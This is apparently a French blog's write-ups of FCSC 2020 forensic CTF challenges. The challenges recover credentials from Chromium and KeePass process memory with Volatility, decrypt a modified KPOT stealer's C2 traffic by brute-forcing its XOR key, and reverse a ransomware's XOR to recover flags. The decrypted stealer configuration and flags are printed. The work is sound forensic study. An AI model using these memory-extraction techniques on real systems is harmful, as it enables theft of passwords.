commencer par chercher le realm Panel-\\o/: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_yarascan -Y \"Panel-\" -p 119187 [...] Task: chromium pid 119187 rule r1 addr 0x7fb1cc163630 0x7fb1cc163630 50 61 6e 65 6c 2d 6f 2f 00 64 6a 37 33 61 65 77 Panel-o/.dj73aew 0x7fb1cc163640 00 00 00 00 33 69 64 74 70 0a 0e cc b1 7f 00 00 ....3idtp....... 0x7fb1cc163650 17 00 00 00 00 00 00 00 1e 00 00 00 00 00 00 00 ................ 0x7fb1cc163660 6a 4d bb 5f 7a 34 0a 9f e0 a0 0e cc b1 7f 00 00 jM._z4.......... 0x7fb1cc163670 09 00 00 00 00 00 00 00 0e 00 00 00 00 00 00 00 ................ 0x7fb1cc163680 34 19 dd 3c f7 a7 5d b8 90 5f 17 cc b1 7f 00 00 4..\u003c..].._...... 0x7fb1cc163690 08 00 00 00 00 00 00 00 0e 00 00 00 00 00 00 00 ................ 0x7fb1cc1636a0 88 bb 94 35 52 22 36 60 03 00 00 00 d1 d0 c5 85 ...5R\"6`........ 0x7fb1cc1636b0 90 73 15 cc b1 7f 00 00 90 73 15 cc b1 7f 00 00 .s.......s...... 0x7fb1cc1636c0 01 00 00 00 00 00 00 00 ac 61 8d 0e 00 00 00 00 .........a...... 0x7fb1cc1636d0 0d ff 2b 37 00 00 00 00 52 7b 0c 9d 60 00 2f 00 ..+7....R{..`./. 0x7fb1cc1636e0 a0 03 00 00 00 00 00 00 25 02 00 00 00 00 00 00 ........%....... 0x7fb1cc1636f0 10 93 18 cc b1 7f 00 00 e0 93 1d cc b1 7f 00 00 ................ 0x7fb1cc163700 90 8d 15 cc b1 7f 00 00 18 00 00 00 00 00 00 00 ................ 0x7fb1cc163710 18 00 00 00 00 00 00 00 4d 31 6a 9e 31 0a a1 0a ........M1j.1... 0x7fb1cc163720 bb 01 7f a4 fc a1 dc f1 00 00 0b 74 24 db 8d cc ...........t$... Cette yararule ne ressort que 4 résultats, il est donc aisé de trouver le bloc qui nous intéresse. En suivant la logique définie précédemment: Second pointeur (rouge), adresse de username: 0x7fb1cc0ea0e0 Troisième pointeur (vert) adresse de password: 0x7fb1cc175f90 Il n’y a plus qu’à extraire la Virtual Memory Area (VMA) et regarder ce qu’il y à ces adresses: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_proc_maps -p 119187 [...] 0xffff9d72bd57cd80 119187 chromium 0x00007fb1cc000000 0x00007fb1cc4e2000 rw- 0x0 0 0 0 [...] ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_dump_map -s 0x00007fb1cc000000 -p 119187 -D /opt/usr_land/wu/119187/ Le nom d’utilisateur: ➜ hexdump -C -s 0x0ea0e0 ../187/Wu/task.119187.0x7fb1cc000000.vma | head -n 4 000ea0e0 41 00 64 00 6d 00 69 00 6e 00 33 00 4b 00 7a 00 |A.d.m.i.n.3.K.z.| 000ea0f0 37 00 00 00 00 00 00 00 a0 26 18 cc b1 7f 00 00 |7........\u0026......| 000ea100 00 00 00 00 00 00 00 00 25 00 00 00 00 00 00 00 |........%.......| 000ea110 60 ab 13 cc b1 7f 00 00 20 06 1e cc b1 7f 00 00 |`....... .......| Admin3Kz7 Le mot de passe: ➜ hexdump -C -s 0x175f90 ../187/Wu/task.119187.0x7fb1cc000000.vma | head -n 4 00175f90 35 00 73 00 64 00 74 00 59 00 68 00 36 00 38 00 |5.s.d.t.Y.h.6.8.| 00175fa0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00175fb0 11 00 00 00 00 00 00 00 75 00 00 00 00 00 00 00 |........u.......| 00175fc0 02 00 00 00 b1 7f 00 00 c0 93 02 cc b1 7f 00 00 |................| 5sdtYh68 ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:6:5","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Solution 2 - La débrousailleuse Cette solution a le mérite d’etre plus rapide que la première. La première chose à faire est d’extraires tous les VMA du processus: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_dump_map -p 119187 -D /opt/usr_land/119187/all_vma/ ➜ strings --print-file-name 119187/all_vma/* | grep 'http://10.42.42.132' task.119187.0x7fb1cc000000.vma: http://10.42.42.132/ task.119187.0x7fb1cc000000.vma: http://10.42.42.132/ task.119187.0x7fb1cc000000.vma: http://10.42.42.132/favicon.ico task.119187.0x7fb1cc000000.vma: http://10.42.42.132/ task.119187.0x7fb1cc000000.vma: http://10.42.42.132/panel/ Au final, une seule portion ressort, il suffit de faire un strings UTF-16 dessus pour voir la magie opérer: ➜ strings -e l -n 6 task.119187.0x7fb1cc000000.vma Admin3Kz7 5sdtYh68 !\u0026(/01=CEIORS_bcfghmvwxy} -78;?ABDFGLMNPTUVW[]jkz{| +234569HJKQXYZq~ ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:6:6","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Flag FCSC{Admin3Kz7:5sdtYh68} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:6:7","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Bonus 1 - Keepass En inspectant les processus en cours d’exécution, on remarque un Keepass: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_psaux Pid Uid Gid Arguments 119514 1001 1001 /usr/bin/cli /usr/lib/keepass2/KeePass.exe Ne connaissant pas ce processus cli, on demande à Google: $ which cli /usr/bin/cli $ which mono /usr/bin/mono $ ls -l /usr/bin/mono -rwxr-xr-x 1 root root 3054984 Jul 24 2012 /usr/bin/mono $ ls -l /usr/bin/cli lrwxrwxrwx 1 root root 21 Apr 17 16:16 /usr/bin/cli -\u003e /etc/alternatives/cli $ ls -l /etc/alternatives/cli lrwxrwxrwx 1 root root 13 Apr 17 16:16 /etc/alternatives/cli -\u003e /usr/bin/mono https://stackoverflow.com/questions/16426041/what-is-difference-between-cli-and-mono-in-unix https://fr.wikipedia.org/wiki/Common_Language_Infrastructure État des lieux Donc on peut dire que cli == mono. Mono est un utilitaire permettant d’exécuter le framework .NET de Microsoft sur Linux. Le fait d’avoir un “Keepass.exe” prend son sens. On sait que les extensions des containers Keepass ont l’extension: .kdbx ➜ cestlarentree cat str_* | grep -i kdbx | sort | uniq /home/Lesage/Documents/pass/mdp.kdbx kdbx KDBX_DetailsFull_HTML.xsl KDBX_DetailsLight_HTML.xsl KDBX_Tabular_HTML.xsl mdp.kdbx mdp.kdbx - KeePass \u003cPath\u003e../../../home/Lesage/Documents/pass/mdp.kdbx\u003c/Path\u003e \u003cPath\u003e../../../home/Lesage/Documents/pass/mdp.kdbx\u003c/Path\u003e /home/Lesage/Documents/pass/mdp.kdbx Les base de données Keepass semblent avoir une signature: ➜ file ./test.kdbx test.kdbx: Keepass password database 2.x KDBX ➜ hexdump -C ./test.kdbx | head -n 2 00000000 03 d9 a2 9a 67 fb 4b b5 01 00 03 00 02 10 00 31 |....g.K........1| 00000010 c1 f2 e6 bf 71 43 50 be 58 05 21 6a fc 5a ff 03 |....qCP.X.!j.Z..| https://keepass.info/help/base/repair.html ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_yarascan -Y \"{03 D9 A2 9A 67 FB 4B B5}\" # Y a wallou Le yarascan n’est pas très concluant. Faisons un test en local pour voir si le contenu du container se trouve dans la mémoire. Test en local Une fois n’est pas coutume, on va procéder de la même manière que dans les challenges précédents en installant un Keepass2 sur notre VM de test. $ apt install keepass2 Master key : JeSuisUnSuperPassword Nom de la bdd : TestFCSC_Database Entrée utilisateur : TESTENTREEKEEPASS_maki Entrée mot de passe : TESTENTREEKEEPASS_PASSWORD La première chose à faire est donc d’essayer de retrouver la Master key: ➜ strings test\\ ecsc\\ deb10-f35aa608.vmem \u003e str ➜ strings -e l test\\ ecsc\\ deb10-f35aa608.vmem \u003e str_el ➜ cat str* | grep \"JeSuisUnSuper\" Ca ne donne rien. Avant de se décourager, on peut essayer pour les entrées: ➜ cat str* | grep -E \"TESTENTREEKEEPASS_maki|TESTENTREEKEEPASS_PASSWORD\" | uniq | sort [...] TESTENTREEKEEPASS_maki TESTENTREEKEEPASS_maki TESTENTREEKEEPASS_PASSWORD TESTENTREEKEEPASS_PASSWORD Title: TESTENTREEKEEPASS_maki, Password: ********, Creation Time: 05/05/2020 17:21:55, Last Modification Time: [...] Bon, pas besoin de la master key s’il est possible de récupérer les informations. Alors, maintenant il faut réussir à localiser précisément où sont les entrées: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/test\\ ecsc\\ deb10-f35aa608.vmem --profile=Linuxecsc_deb540x64 linux_dump_map -p 814 -D /opt/usr_land/vma/ ➜ strings --print-file-name -e l * | grep -E \"TESTENTREEKEEPASS_maki|TESTENTREEKEEPASS_PASSWORD\" | cut -d':' -f1 | uniq task.814.0x7f3c83800000.vma ➜ strings -e l task.814.0x7f3c83800000.vma | grep -E \"TESTENTREEKEEPASS_maki|TESTENTREEKEEPASS_PASSWORD\" | sort | uniq [...] MeGYxEBVnEsTrGroup:HPRIZOIDrzIXZ Database, MeGYxEBVnEsTrTitle:HPRIZOIDrzIXZ TESTENTREEKEEPASS_maki, MeGYxEBVnEsTrPassword:HPRIZOIDrzIXZ ********, MeGYxEBVnEsTrCreation Time:HPRIZOIDrzIXZ 05/05/2020 17:21:55, MeGYxEBVnEsTrLast Modification Time:HPRIZOIDrzIXZ 05/05/2020 17:22:56 RIZOIDrzIXZ TESTENTREEKEEPASS_maki, MeGYxEBVnEsTrPassword:HPRIZO s16 M","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:6:8","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":" Un ami vous demande de l’aide pour déterminer si l’email qu’il vient d’ouvrir au sujet du Covid-19 était malveillant et si c’était le cas, ce qu’il risque. Il prétend avoir essayé d’ouvrir le fichier joint à cet mail sans y parvenir. Peu de temps après, une fenêtre liée à l’anti-virus a indiqué, entre autre, le mot KPOT v2.0 mais rien d’apparent n’est arrivé en dehors de cela. Après une analyse préliminaire, votre ami vous informe qu’il est probable que ce malware ait été légèrement modifié, étant donné que le contenu potentiellement exfiltré (des parties du format de texte et de fichier avant chiffrement) ne semble plus prédictible. Il vous recommande donc de chercher d’autres éléments pour parvenir à l’aider. Vous disposez d’une capture réseau de son trafic pour l’aider à déterminer si des données ont bien été volées et lui dire s’il doit rapidement changer ses mots de passe ! SHA256(pws.pcap) = 98e3b5f1fa4105ecdad4880cab6a7216c5bb3275d7367d1309ab0a0d7411475d - 463MB ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020chapardeur/:0:0","tags":["anssi","fcsc","malware","forensic","botnet","cryptography"],"title":"[French FCSC] - Chapardeur de mots de passe","uri":"maki.bzh/writeups/fcscfrench2020chapardeur/"},{"categories":["Writeups"],"content":"TL;DR Un challenge de PCAP assez lourd (~500 Mo). Il faut trouver la connexion du malware au panel de C2, récupérer les bytes chiffrés. En se documentant on sait qu’il est possible de bruteforce la clé assez rapidement et de récupérer le flag. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020chapardeur/:1:0","tags":["anssi","fcsc","malware","forensic","botnet","cryptography"],"title":"[French FCSC] - Chapardeur de mots de passe","uri":"maki.bzh/writeups/fcscfrench2020chapardeur/"},{"categories":["Writeups"],"content":"État de l’art On commence donc cette épreuve avec un gros PCAP. Le souci des gros PCAP est qu’il est facile de se perdre dedans en suivant de fausses pistes. Pour éviter ça, il faut savoir ce que l’on cherche avant de plonger tête baissée dedans. Ce qu’on sait: Le malware est un KPOT v2.0 modifié. Ce qu’on cherche: Des indices de compromission d’un KPOT v2.0. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020chapardeur/:2:0","tags":["anssi","fcsc","malware","forensic","botnet","cryptography"],"title":"[French FCSC] - Chapardeur de mots de passe","uri":"maki.bzh/writeups/fcscfrench2020chapardeur/"},{"categories":["Writeups"],"content":"Analyse du malware Dans ma méthodologie, il est possible (et c’est souvent le cas), que le “ce qu’on cherche” demande des connaissances pas encore acquises. En l’occurrence, on connait le malware utilisé et il existe des analyses détaillées: https://www.proofpoint.com/us/threat-insight/post/new-kpot-v20-stealer-brings-zero-persistence-and-memory-features-silently-steal Proofpoint propose une analyse complète du malware. On peut maintenant affiner le “ce qu’on cherche”: Le RTF ou document de macro utilisé pour drop le malware ; Des connexions vers “past.ee”; Des connexions vers “gate.php”; Trouver la clé de chiffrement du XOR; Trouver le C2 avec une requête GET puis une requête POST. Cependant, il ne faut pas oublier que l’énoncé nous dit: il est probable que ce malware ait été légèrement modifié, étant donné que le contenu potentiellement exfiltré (des parties du format de texte et de fichier avant chiffrement) ne semble plus prédictible ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020chapardeur/:3:0","tags":["anssi","fcsc","malware","forensic","botnet","cryptography"],"title":"[French FCSC] - Chapardeur de mots de passe","uri":"maki.bzh/writeups/fcscfrench2020chapardeur/"},{"categories":["Writeups"],"content":"Trouver la connexion suspecte Le fait de chercher “gate.php” est une bonne piste: Il y a quelque chose de rigolo: toutes les connexions sont uniques sauf la dernière. Toutes les connexions sont de simple GET avec de la data chiffrées et encodées en b64, mais pas la dernière: C’est une requête POST avec de la donnée chiffrée brute, serait-ce notre flag tant attendu? On verra ça plus tard. L’article de Proofpoint nous dit que la clé XOR est hardcodée dans le binaire. Mais il n’y a pas de binaire apparent dans ce PCAP (pour vérifier, un binwalk et “Fichiers -\u003e Exporter objet -\u003e HTTP”). Donc il faut trouver un autre moyen. On sait que c’est du XOR et on connait le format de la configuration envoyée à “gate.php”. Toujours dans l’exemple de proofpoint: Configuration 1111111111111100__DELIMM__A.B.C.D__DELIMM__appdata__GRABBER__*.log,*.txt,__GRABBER__%appdata%__GRABBER__0__GRABBER__1024__DELIMM__desktop_txt__GRABBER__*.txt,__GRABBER__%userprofile%\\Desktop__GRABBER__0__GRABBER__150__DELIMM____DELIMM____DELIMM__ Clé du XOR 4p81GSwBwRrAhCYK La clé fait 16 bytes, l’espèce de binaire du début de la configuration fait 16 bytes. De plus, la clé a un charset alphanumérique, soit: [A-Za-z0-9]. Il ne reste qu’à bruteforce tout ça pour trouver la clé qui nous intéresse. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020chapardeur/:4:0","tags":["anssi","fcsc","malware","forensic","botnet","cryptography"],"title":"[French FCSC] - Chapardeur de mots de passe","uri":"maki.bzh/writeups/fcscfrench2020chapardeur/"},{"categories":["Writeups"],"content":"Bruteforce de la clé Le fichier enc_dat est le base64 décodé de la connexion GET au C2. #!/usr/bin/python3 from ENO import * import itertools enc_dat = open('enc_dat','rb').read() # Génération de toutes les possibilités du binaire lst_bin = [] for i in itertools.product(range(2),repeat=16): lst_bin.append(\"\".join(map(str,i))) # On filtre sur les clés potentielles (le filtrage aurait pu être mieux) pot_key = [] for l in lst_bin: tmp = cribDrag(enc_dat,l.encode()) for j in tmp: if j.decode().isprintable(): pot_key.append(j) # On bruteforce jusqu'à trouver la configuration déchiffrée for k in pot_key: decrypt_dat = strxor(enc_dat,k) if decrypt_dat.decode()[:16].isprintable(): if \"__DELIMM____DELIMM__\" in decrypt_dat.decode(): print(f\"Key : {k}\\nData : {decrypt_dat}\\n\\n\") Après environ 1 petite minute, on trouve: ➜ chapardeyr python3 ./bf.py Key : b'tDlsdL5dv25c1Rhv' Data : b'0110101110111110__DELIMM__218.108.149.373__DELIMM__appdata__GRABBER__*.log,*.txt,__GRABBER__%appdata%__GRABBER__0__GRABBER__1024__DELIMM__desktop_txt__GRABBER__*.txt,__GRABBER__%userprofile%\\\\Desktop__GRABBER__0__GRABBER__0__DELIMM____DELIMM____DELIMM__' ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020chapardeur/:5:0","tags":["anssi","fcsc","malware","forensic","botnet","cryptography"],"title":"[French FCSC] - Chapardeur de mots de passe","uri":"maki.bzh/writeups/fcscfrench2020chapardeur/"},{"categories":["Writeups"],"content":"Déchiffrement du message Yapluka :) from ENO import * key = b'tDlsdL5dv25c1Rhv' enc = htos(\"2b003e3234097431296249164260181301363d06017e78501a13154363661b0501365f09491a5a10045718225c63453300691a1c552f04321946470655205c061125192c220f66277c49015508375047427c5b425c750c5213510d50506b5a1717205a15017a575d1502060007310d1246255f125329020544020d5a53675b4216250d165d7b54530b386a2763133833351133\") print(strxor(enc,key)) b’DRAPEAU_P|us2peurQue2M4l! R4ssur3z-Votre-Am1-Et-vo1c1Votredr4peau_FCSC\\n{469e8168718996ec83a92acd6fe6b9c03c6ced2a3a7e7a2089b534baae97a7}\\n_DRAPEAU' En l’occurrence, comme l’énoncé le disait, le code du malware a été modifié, ainsi la structure de la connexion POST change et ne propose plus “_FFFILEE_” ou “_SYSINFORMATION_”. Il faut lire avait de râler :D ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020chapardeur/:6:0","tags":["anssi","fcsc","malware","forensic","botnet","cryptography"],"title":"[French FCSC] - Chapardeur de mots de passe","uri":"maki.bzh/writeups/fcscfrench2020chapardeur/"},{"categories":["Writeups"],"content":"Flag FCSC{469e8168718996ec83a92acd6fe6b9c03c6ced2a3a7e7a2089b534baae97a7} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020chapardeur/:7:0","tags":["anssi","fcsc","malware","forensic","botnet","cryptography"],"title":"[French FCSC] - Chapardeur de mots de passe","uri":"maki.bzh/writeups/fcscfrench2020chapardeur/"},{"categories":["Writeups"],"content":" Un de nos admins nous a appelé en urgence suite à un CryptoLocker qui s’est lancé sur un serveur ultra-sensible, juste après avoir appliqué une mise à jour fournie par notre prestataire informatique. Ce malware vise spécifiquement un fichier pouvant faire perdre des millions d’euros à notre entreprise : il est très important de le retrouver ! L’administrateur nous a dit que pour éviter que le logiciel ne se propage, il a mis en pause le serveur virtualisé et a récupéré sa mémoire vive dès qu’il a détecté l’attaque. Vous êtes notre seul espoir. SHA256(memory1.dmp.gz) = 39e31ca61067e51f9566f0b669ac1ddbd09924a6f7720dcb08c9ac46cee186f5. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020cryptolocker/:0:0","tags":["forensic","malware","volatility"],"title":"[French FCSC] - Cryptolocker","uri":"maki.bzh/writeups/fcscfrench2020cryptolocker/"},{"categories":["Writeups"],"content":"TL;DR Un dump mémoire Windows 7 où un ransomware a été exécuté. Le processus “updater” est le ransomware. Il est possible de récupérer les fichiers de flag et de clé dans les dossiers de l’utilisateur courant. Un peu de rétro-ingénierie sur le binaire montre que c’est un xor un peu modifié. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020cryptolocker/:1:0","tags":["forensic","malware","volatility"],"title":"[French FCSC] - Cryptolocker","uri":"maki.bzh/writeups/fcscfrench2020cryptolocker/"},{"categories":["Writeups"],"content":"État des lieux On commence cette épreuve avec un dump de la mémoire d’un Windows visiblement: ➜ file memory.dmp memory.dmp: MS Windows 32bit crash dump, PAE, full dump, 262030 pages On sort notre plus beau volatility et on cherche le bon profil: ➜ python volatility/vol.py -f /opt/usr_land/memory.dmp imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : WindowsCrashDumpSpace32 (Unnamed AS) AS Layer3 : FileAddressSpace (/opt/usr_land/memory.dmp) PAE type : PAE DTB : 0x185000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2020-04-13 18:39:35 UTC+0000 Image local date and time : 2020-04-13 11:39:35 -0700 Le profile à utiliser est: Win7SP1x86_23418 Avant de partir comme un débile dans le dump, il faut se poser et se demander ce qu’on sait et ce qu’on cherche. Ce qu’on sait: Déclenchement juste après l’exécution d’une mise à jour ; Le malware vise un fichier (flag ?) ; Dump mémoire Windows 7. Ce qu’on cherche: Le malware ; Le fichier chiffré ; Le mécanisme de chiffrement. Aller, yapluka. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020cryptolocker/:2:0","tags":["forensic","malware","volatility"],"title":"[French FCSC] - Cryptolocker","uri":"maki.bzh/writeups/fcscfrench2020cryptolocker/"},{"categories":["Writeups"],"content":"Localiser le malware Comme le malware a été exécuté après une mise à jour, voyons ce que les processus donnent: ➜ python volatility/vol.py -f /opt/usr_land/memory.dmp --profile=Win7SP1x86_23418 pstree Volatility Foundation Volatility Framework 2.6.1 Name Pid PPid Thds Hnds Time -------------------------------------------------- ------ ------ ------ ------ ---- 0x85093c90:explorer.exe 1432 1320 28 756 2020-04-13 18:37:17 UTC+0000 [...] . 0x83de43a8:update_v0.5.ex 3388 1432 2 61 2020-04-13 18:38:00 UTC+0000 [...] Je ne suis pas un expert Windows, mais de mémoire le processus de mise à jour, ce n’est pas du tout update_v0.5.exe. On peut essayer de l’extraire et regarder rapidement ce que c’est: ➜ python volatility/vol.py -f /opt/usr_land/memory.dmp --profile=Win7SP1x86_23418 procdump -p 3388 -D /opt/usr_land/Wu/ Volatility Foundation Volatility Framework 2.6.1 Process(V) ImageBase Name Result ---------- ---------- -------------------- ------ 0x83de43a8 0x00400000 update_v0.5.ex OK: executable.3388.exe Alors déjà, qu’est ce que c’est que ce fichier: ➜ file executable.3388.exe executable.3388.exe: PE32 executable (console) Intel 80386, for MS Windows ➜ strings executable.3388.exe [...] [info] entering the folder : %s flag.txt [info] file encryptable found : %s ENCRYPTOR v0.5 key.txt [error] can't read the key-file :s ****Chiffrement termin e ! Envoyez l'argent ! [...] Déjà, pas de bol, ce n’est pas du .net. Ensuite, le binaire n’a pas l’air super friendly. Il parle de “flag.txt” et “key.txt”. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020cryptolocker/:3:0","tags":["forensic","malware","volatility"],"title":"[French FCSC] - Cryptolocker","uri":"maki.bzh/writeups/fcscfrench2020cryptolocker/"},{"categories":["Writeups"],"content":"Récupération du flag chiffré et de la clé On va voir si ces fichiers sont présents en mémoire: ➜ python volatility/vol.py -f /opt/usr_land/memory.dmp --profile=Win7SP1x86_23418 filescan \u003e /opt/usr_land/Wu/filescan Volatility Foundation Volatility Framework 2.6.1 ➜ cat filescan| grep -E \"flag\\.txt|key\\.txt\" 0x000000003e6fa100 8 0 RW-rw- \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\key.txt 0x000000003ed13898 2 1 R--rw- \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\key.txt 0x000000003ed139f0 2 0 RW-rw- \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\flag.txt.enc Il semblerait que ces fichiers soient présents. Par acquit de conscience, on peut regarder ce qu’il y a d’autre sur le bureau de l’utilisateur: ➜ cat filescan| fgrep '\\IEUser\\Desktop\\' 0x000000003e6fa100 8 0 RW-rw- \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\key.txt 0x000000003e90b1e8 3 0 R--r-d \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\DumpIt.exe 0x000000003eb40430 8 0 R--rwd \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\desktop.ini 0x000000003ed13898 2 1 R--rw- \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\key.txt 0x000000003ed139f0 2 0 RW-rw- \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\flag.txt.enc 0x000000003ed66b60 6 0 R--r-d \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\update_v0.5.exe 0x000000003fdec360 1 1 RW-rw- \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\IEWIN7-20200413-183930.dmp Bon, bah le malware est là aussi, ce n’était pas obligatoire de l’extraire des process. Il est temps de récupérer les deux fichiers qui nous intéressent. ➜ python volatility/vol.py -f /opt/usr_land/memory.dmp --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003ed13898 -D /opt/usr_land/Wu/ Volatility Foundation Volatility Framework 2.6.1 DataSectionObject 0x3ed13898 None \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\key.txt SharedCacheMap 0x3ed13898 None \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\key.txt ➜ python volatility/vol.py -f /opt/usr_land/memory.dmp --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003ed139f0 -D /opt/usr_land/Wu/ Volatility Foundation Volatility Framework 2.6.1 DataSectionObject 0x3ed139f0 None \\Device\\HarddiskVolume1\\Users\\IEUser\\Desktop\\flag.txt.enc Une analyse rapide des fichiers: ➜ cat file.None.0x854fbc98.dat 0ba883a22afb84506c8d8fd9e42a5ce4e8eb1cc87c315a28dd ➜ cat file.None.0x855651e0.dat '{kp�U] SUU ]Y^\\TQU^UWR[W\\QTPQ ^UQUVYZWQRWZP% ➜ cat file.None.0x855651e0.dat | wc -c 4096 C’est étrange d’avoir une taille de 4096, mais pas beaucoup de bytes à l’affichage. Un rapide hexdump montre qu’il y a plein de null bytes (merci volatility, je suppose qu’une page mémoire c’est 4Kb, et qu’il pad avec du \\x00). ➜ hexdump -C file.None.0x855651e0.dat 00000000 27 7b 6b 70 1a 01 00 55 05 07 5d 0c 53 55 05 55 |'{kp...U..].SU.U| 00000010 09 5d 59 5e 06 5c 04 02 06 54 07 51 00 55 01 5e |.]Y^.\\...T.Q.U.^| 00000020 55 57 52 5b 57 5c 51 54 50 07 51 07 0b 5e 55 51 |UWR[W\\QTP.Q..^UQ| 00000030 55 56 02 59 5a 07 05 02 57 51 52 01 0f 03 57 02 |UV.YZ...WQR...W.| 00000040 06 01 5a 50 0f 1b 6e 00 00 00 00 00 00 00 00 00 |..ZP..n.........| 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| * 00001000 On récupère les bytes qui nous intéressent et on en fait un fichier sans null bytes. Et juste pour le fun on sort un sexy one liner: ➜ hexdump -C file.None.0x855651e0.dat | cut -c11-60 | tr -d '\\n ' | sed 's/0000//g' | sed 's/..$//g' | xxd -r -p | wc -c 71 On sait que ce n’est pas de l’AES, vu que ce n’est pas un multiple de 16. Par intuition, je ne pense pas que ce soit du RSA, EC ou autre chiffrement asymétrique. Donc on va se laisser penser que c’est un xor. Mais il est temps de reverse le malware. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020cryptolocker/:4:0","tags":["forensic","malware","volatility"],"title":"[French FCSC] - Cryptolocker","uri":"maki.bzh/writeups/fcscfrench2020cryptolocker/"},{"categories":["Writeups"],"content":"Reverse du malware Notre petit pote il ouvre bien le fichier “key.txt” et le stock dans un buffer: La fonction que j’ai renommée encrypt_n_xor prend le chemin du flag en paramètre: En fin de compte, l’hypopthèse de départ était bonne, c’est bien un xor: C’est donc un xor où la clé est parcourue avec un décalage de +2 octets. Si on récapitule ce qu’on cherchait au départ: Le malware -\u003e Le binaire “update_v0.5.exe” ; Le fichier chiffré -\u003e Le fichier “flag.txt.enc” ; Le mécanisme de chiffrement -\u003e Un xor un peu revisité avec le fichier “key.txt”. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020cryptolocker/:5:0","tags":["forensic","malware","volatility"],"title":"[French FCSC] - Cryptolocker","uri":"maki.bzh/writeups/fcscfrench2020cryptolocker/"},{"categories":["Writeups"],"content":"Déchiffrer le flag Il ne reste qu’à déchiffrer: from ENO import * key = b\"0ba883a22afb84506c8d8fd9e42a5ce4e8eb1cc87c315a28dd\" enc_dat = htos(\"277b6b701a01005505075d0c53550555095d595e065c0402065407510055015e5557525b575c5154500751070b5e5551555602595a070502575152010f03570206015a500f1b6e\") flag = \"\" for i in range(len(enc_dat)): flag += chr(enc_dat[i] ^ key[(i+2)%len(key)]) print(flag) ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020cryptolocker/:6:0","tags":["forensic","malware","volatility"],"title":"[French FCSC] - Cryptolocker","uri":"maki.bzh/writeups/fcscfrench2020cryptolocker/"},{"categories":["Writeups"],"content":"Flag FCSC{324cee8fe3619a8bea64522eadf05c84df7c6df9f15e4cab4d0e04c77b20bb47} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020cryptolocker/:7:0","tags":["forensic","malware","volatility"],"title":"[French FCSC] - Cryptolocker","uri":"maki.bzh/writeups/fcscfrench2020cryptolocker/"},{"categories":["Writeups"],"content":"Bonus Il est possible d’utiliser le plugin “mft_parser” de volatility pour récupérer le contenu de “key.txt” et “flag.txt.enc”. J’utilise toujours ce plugin au début d’un challenge de mem Windows, des fois que le flag soit dans les fichiers résidents :D 